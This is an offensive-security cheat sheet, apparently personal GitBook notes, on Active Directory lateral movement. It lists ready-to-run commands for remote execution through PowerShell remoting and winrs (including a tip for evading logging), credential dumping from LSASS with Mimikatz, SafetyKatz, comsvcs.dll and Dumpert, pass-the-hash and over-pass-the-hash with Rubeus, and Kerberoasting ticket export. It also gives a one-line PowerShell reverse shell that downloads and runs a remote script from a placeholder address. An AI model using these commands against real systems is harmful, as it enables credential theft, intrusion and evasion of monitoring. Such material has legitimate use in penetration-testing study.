# AD - Lateral Movement / Connections

## **Basics**

**PowerShell Remoting**

* Its like psexec on steroids
* Enabled by default on Server 2012 and newer
* May need to enable remoting Enable-PSRemoting (admin privs required) e.g Win10
* You get an elevated shell if admin creds are use - so a lot of UAC Issues are not relevant
* Port 5985/5986 (SSL Encrypted) - is used (based on WinRM)
* One-To-One or One-To-Many (non-interactive, executes parallely)&#x20;
* Credentials are not left on target unless CredSSP/Unconstraned Delegation?
* Runs in process "wsmprovhost" and is stateful

## **Connections / WinrRS**

**Windows Remote Management (cmd.exe)**\
winrs -r:hostname cmd

## **Connections / PowerShellRemoting**

**Access C disk of a computer (check local admin)**\
ls \\\\\[hostname]\c$

**Connect to machine with administrator privs**

```powershell
Enter-PSSession -Computername

Use winrs of PSRemoting to evade the logging
winrs -r:hostname cmd
winrs -r:hostname -u:server\usernmae -p:password-of-user command-to-run

Other Remoting
Use winrm.vbs and/or COM objects of WSMan object https://github.com/bohops/WSMan-WinRM 
```

****\
**1-1 Save and use sessions of a machine**

```powershell
$sess = New-PSSession -Computername hostname.local
$sess = New-PSSession -Computername hostname.local -credential
Enter-PSSession $sess


No local file be included in Enter-PSSession/New-PSSession
```

**1-n Execute commands on a machine(s) (non-interactive)**

{% code overflow="wrap" %}
```powershell
Invoke-Command -Computername hostname -Scriptblock {whoami;hostname}
❗Invoke-Command -Scriptblock {hostname;whoami} -Computername (Get-Content ad_computers.txt)
Invoke-Command -Computername hostname -Scriptblock {$executioncontext.sessionstate.languagemode}
Invoke-Command -Scriptblock {whoami} -Computername (Get-Content <list-of-servers-file>) 
```
{% endcode %}

**1-n Execute script on a machine**

{% code overflow="wrap" %}
```powershell
Invoke-Command -FilePath  C:\scripty\a.ps1 -Computername (Get-Content <list-of-servers-file>) 
❗Invoke-Command -FilePath C:\scripty\a.ps1 -Session $sess
   Enter-PSSession -Session $sess
   functionname_in_a.ps1
```
{% endcode %}



**1-n Execute locally loaded function on a list of remote machines**

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Invoke-Command -Scriptblock ${function:test} -Computername (Get-Content &#x3C;list_of_servers>)

<strong>❗Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content &#x3C;list_of_servers>)
</strong>A file/function test.ps1 is creatd and . .\test.ps1 With the content
function test
{
 Write-Output "Test" 
}
</code></pre>

then run "test"  => Then we can run Invoke-Command -Scriptblock ${function:test} -Computername a\_host

**1-n Execute locally loaded function on a list of remote machines & passing arguemnts (only positional arguments could be passed)**

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Invoke-Command -ScriptBlock ${fucntion:GetPassHashes} -Hostname a_host -ArgumentList

<strong>Use "Stateful" command using Invoke-Command:
</strong>$sess = New-PSSession -computername host1
Invoke-Command -session $sess -ScriptBlock {$Proc = Get-Process}
Invoke-Command -session $sess -ScriptBlock {$Proc.Name}
</code></pre>

**1-1 Copy script to other server**

```powershell
Copy-Item .\Invoke-MimikatzEx.ps1 \\hostname\c$\'Program Files'
```

**1-1 Powershell reverse shell**

{% code overflow="wrap" %}
```powershell
powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000
```
{% endcode %}

## Extracint Credentials from LSASS

<pre class="language-powershell"><code class="lang-powershell">**Mimikatz**
Invoke-Mimikatz -command '"sekurlsa::ekeys"'

**SafetyKatz** minidump oflsass and PELoader to run Mimikatz
safetykatz.exe "sekurlsa::ekeys"    
<strong>
</strong><strong>**SharpKatz** - C# port of some Mimikatz functionalitities
</strong>sharpkatz.exe --command ekeys

**Dumpert** (Direct System Calls and API unhookking)
rundll32.exe C:\Dumpert\Outflank-dumpert.dll,Dump

**PyPyKatz*
pypykatz.exe live lsa

**comsvcs.dll**
tasklist /FI "IMAGENAME eq lsass.exe"
runddl32.exe C:\windows\system32\comsvcs.dll, MiniDump &#x3C;lsass pid> C:\Users\Public\lsass.dmp full

**From Linux**
Impacket
Physmem2profit
</code></pre>

## 🐱 Mimikatz - Invoke-Mimikatz

* Dump credentials, tickets, passing & replaying hashes
* Using the code from ReflectivePEInjection mimikatz is loaded reflectively into memory.
* Administrative Privilege is needed for reading/writing to lsass e.g. dumping creds

**Dump credentials on local/remote machine**

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -command '"sekurlsa::ekeys"'

Invoke-Mimikatz -DumpCreds   //default parameter
❗Invoke-Mimikatz -DumpCreds -Computername @("host1","host2")    //uses PowerShell remoting cmdlet Invoke-Command (need local admin privs on remote host)
```
{% endcode %}

**Write to lsass / "over pass the hash" - generate tokens from hashes (we have the hash for the User specified)**

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -command '"sekurlsa::pth /user:Administrator /domain:dom.local /ntlm:<ntlmhash> /run:powershell.exe"'
```
{% endcode %}

Creates a valid kerberos ticket using the ntlm hash of a user. Authenticate to Kerberos enabled Services afterfwards.



**Extracting credentials from credentials vault / scheduled tasks**

```powershell
Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
```





## **🍳Kerberoasting**

### **Description**

### **Attack commands**

**See existing tickets**\
klist

**Remove all tickets**\
****klist purge

**Request a kerberos service ticket for a specific SPN - output Hashcat format**\
****Powerview - Request-SPNTicket -SPN "name/target.domain.local" \[-OutputFormat JTR]

**Manually**\
Add-Type -AssemblyName System.IdentityModel

{% code overflow="wrap" %}
```powershell
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "name/target.domain.local"
```
{% endcode %}

**Dump the ticket**

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
=> Now Crack
```
{% endcode %}



## ⏩Over-Pass the Hash

### Description



### Attack commands

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Needs Admin rights:
Invoke-Mimikatz '"sekurlsa::pth /user:Administrator /domain:target.domain.local &#x3C; /ntlm:hash | /aes256:hash> /run:powershell.exe'"

Safetykatz.exe "sekurlsa::pth /user:administrator /domain:dom.local /aes256:hash /run:powershell.exe" "exit"

=> Generates powershell session with logon type type 9 same as runas /netonly
<strong>
</strong><strong>-------------
</strong>No Admin rights needed
<strong>Rubeus.exe asktgt /user:USER &#x3C;/rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/opsec] /ptt
</strong><strong>
</strong><strong>Needs admin rights:
</strong><strong>Rubeus.exe asktgt /user:administrator /aes256:hash /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
</strong></code></pre>
